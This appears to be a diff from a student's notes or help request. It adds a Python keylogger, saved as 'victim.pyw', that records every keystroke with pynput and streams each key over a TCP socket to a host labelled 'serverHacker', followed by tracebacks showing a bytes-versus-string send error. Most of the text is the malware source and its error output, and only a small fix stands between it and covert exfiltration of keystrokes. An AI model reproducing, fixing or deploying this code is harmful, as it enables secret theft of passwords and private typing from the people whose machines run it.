@@ -37,4 +37,75 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'pynput'
 
 
-with  Listener(on_press =  on_press) as hacker:     
+with  Listener(on_press =  on_press) as hacker:  
+
+
+from  pynput.keyboard import Listener
+import socket
+
+clientSocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
+
+serverHacker = '192.168.1.15'
+serverPort = 12345
+clientSocket.connect((serverHacker, serverPort))
+
+
+def on_press(key):
+    key = str(key)
+    key = key.replace("'", "")
+    if key == "Key.f12":
+        raise SystemExit(0)
+    if key == "Key.shift":
+        key = ""
+    if  key == "Key.ctrl_l":
+        key = ""
+    if key == "Key.alt_l":
+        key = ""
+    if key == "Key.tab":
+        key = "\t";
+    if key == "Key.enter":
+        key = "\n"
+    if key == "Key.space":
+        key = "_"
+    # with open("D:\\PBL4\\log.txt", "a") as file:
+    #     file.write(key)
+    clientSocket.send(key)
+    print(key , end = '')
+
+
+with  Listener(on_press =  on_press) as hacker:         
+    hacker.join()
+lỗi:
+Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
+    return f(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
+    if f(*args) is False:
+       ^^^^^^^^
+  File "d:\PBL4\victim.pyw", line 30, in on_press
+    clientSocket.send(key)
+TypeError: a bytes-like object is required, not 'str'
+Traceback (most recent call last):
+  File "d:\PBL4\victim.pyw", line 34, in <module>
+    with  Listener(on_press =  on_press) as hacker:         hacker.join()
+                                                            ^^^^^^^^^^^^^
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 276, in join
+    six.reraise(exc_type, exc_value, exc_traceback)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\six.py", line 718, in reraise
+    raise value.with_traceback(tb)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 228, in inner
+    return f(self, *args, **kwargs)
+           ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\keyboard\_win32.py", line 287, in _process
+    self.on_press(key)
+  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\pynput\_util\__init__.py", line 144, in inner
+    if f(*args) is False:
+       ^^^^^^^^
+  File "d:\PBL4\victim.pyw", line 30, in on_press
+    clientSocket.send(key)
+TypeError: a bytes-like object is required, not 'str'
+
